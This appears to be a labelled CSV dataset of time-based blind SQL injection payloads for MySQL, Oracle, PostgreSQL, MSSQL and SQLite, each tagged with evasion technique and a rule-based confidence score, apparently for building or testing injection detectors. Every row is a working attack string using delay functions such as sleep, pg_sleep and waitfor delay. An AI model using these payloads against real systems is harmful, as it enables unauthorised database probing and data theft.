payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual ) +'",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'bzxo' like 'bzxo",time_blind,sqlite,case_variation|function_alternative,0.53,rule,sqliv2_csv,unknown
"1%"" or sleep ( 5 ) and ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"waitfor delay '0:0:5' and ( ( ""ykgm"" = ""ykgm",time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual#",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""layz"" = ""layz",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
1 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""%"" = """,time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1', ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( 'vwmx' = 'vwmx,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
select sleep ( 5 ) and 'yzix' = 'yzix,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" and sleep ( 5 ) and ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1' and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) where 1527 = 1527 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1%"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'zurf' = 'zurf",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1%' rlike sleep ( 5 ) and '%' = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1'|| ( select 'zeet' from dual where 9567 = 9567 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1%"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'ekqv' = 'ekqv",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1"" ) as ghpx where 2873 = 2873 waitfor delay '0:0:5'--",time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
"1"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""cwwv"" like ""cwwv",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
"1"" ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1%' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1 ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""hsaw"" = ""hsaw",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1'|| ( select 'ycya' from dual where 3536 = 3536 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1%"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) #",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1%' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( '%' = '",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 'medg' = 'medg",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1' ) and sleep ( 5 ),time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) waitfor delay '0:0:5' and ( ""vjpg"" = ""vjpg",time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1%"" ) or sleep ( 5 ) and ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' rlike sleep ( 5 ),time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 and elt ( 1210 = 1210,sleep ( 5 ) ) # macc",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""%"" = """,time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 4574 = 4574,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'gtri' from dual where 7097 = 7097 and elt ( 1210 = 1210,sleep ( 5 ) ) ) ||'",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'mqoj' like 'mqoj,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""poik"" = ""poik",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
1 ) where 4653 = 4653 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1' ) where 3476 = 3476 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'quqx' = 'quqx",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""fvrq"" = ""fvrq",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" or sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) ) ) or sleep ( 5 ) and ( ( ( 2209 = 2209,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) as zxho where 5907 = 5907 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1%"" ) or sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
else dbms_lock.sleep ( 0 ),time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) as yuqr where 7226 = 7226 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"select pg_sleep ( 5 ) and ( ( ""byhx"" like ""byhx",time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( '%' = '",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1"" ) ) as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'jnmf' = 'jnmf",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' and '%' = ',time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""rurz"" = ""rurz",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' where 4403 = 4403 rlike sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""eqmy"" = ""eqmy",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and '%' = '",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) as yiaw where 2841 = 2841 or sleep ( 5 ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'svuu' = 'svuu,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'mbxh' like 'mbxh",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) and ( ( '%' = ',time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) as rhea where 2982 = 2982 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ),time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) as ssxj where 3845 = 3845 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1' ) where 8586 = 8586 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) #,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) where 2922 = 2922 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( 'uyft' = 'uyft,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 ) ) as llnm where 6510 = 6510 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
1' in boolean mode ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'dtzt' like 'dtzt,time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
1' where 9003 = 9003 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
"1"" ) waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"select sleep ( 5 ) and ""irxg"" = ""irxg",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) ) waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""utlk"" like ""utlk",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1%"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1, ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" ) where 3958 = 3958 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
1'|| ( select 'sdll' where 5074 = 5074 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) ) ||',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) as ztrb where 1052 = 1052 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1%"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" where 7279 = 7279 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) as viex where 6242 = 6242 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu )",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) ) ) waitfor delay '0:0:5' and ( ( ( 3481 = 3481,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1%' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( '%' = '",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" where 7371 = 7371 waitfor delay '0:0:5'--",time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""%"" = """,time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
1%' ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1 ) where 1880 = 1880 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'lzbn' = 'lzbn,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""%"" = """,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""ejpw"" = ""ejpw",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) rlike sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'aatp' = 'aatp",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1%"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) lrov ),time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) ) waitfor delay '0:0:5' and ( ( 'jcfe' = 'jcfe,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1, ( select ( case when ( 7734 = 7734 ) then ( select benchmark ( 5000000,md5 ( 0x72747341 ) ) ) else 7734* ( select 7734 from mysql.db ) end ) )",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' in boolean mode ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' and sleep ( 5 ) and 'kapr' = 'kapr,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""mynm"" like ""mynm",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
1'|| ( select 'vwls' where 5252 = 5252 rlike sleep ( 5 ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""sxih"" = ""sxih",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'xdce' = 'xdce",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"waitfor delay '0:0:5' and ( ( ""%"" = """,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1"" ) ) and sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'ochr' like 'ochr",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
"1 ) where 7978 = 7978 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1' ) where 9304 = 9304 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1"" where 9792 = 9792 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'tzrd' = 'tzrd",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" ) as ymsc where 3694 = 3694 waitfor delay '0:0:5'--",time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
"1 ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1' ) where 5540 = 5540 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
1'+ ( select lptb where 3861 = 3861 or sleep ( 5 ) ) +',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""eakt"" like ""eakt",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1'+ ( select vxax where 9036 = 9036 and elt ( 1210 = 1210,sleep ( 5 ) ) ) +'",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) as bpap where 7758 = 7758 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'xmwj' = 'xmwj",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1' ) or elt ( 6272 = 6272,sleep ( 5 ) )",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1%' ) ) ) rlike sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) or sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 ) as iuje where 1976 = 1976 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1%"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1 ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 3332 = 3332,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1'|| ( select 'scwx' where 6591 = 6591 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) ||'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'nczi' = 'nczi",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1 ) ) rlike sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1"" ) as yzny where 4869 = 4869 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1%"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'fnna' = 'fnna",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( '%' = '",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
